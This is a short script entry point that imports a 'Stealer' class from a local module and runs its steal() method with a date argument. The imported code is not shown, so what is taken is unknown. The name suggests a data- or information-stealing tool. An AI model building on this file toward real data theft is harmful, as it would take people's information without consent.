import { Stealer } from './stealer'

async function boot() {
  await new Stealer('2022-12-20').steal()
}

boot()
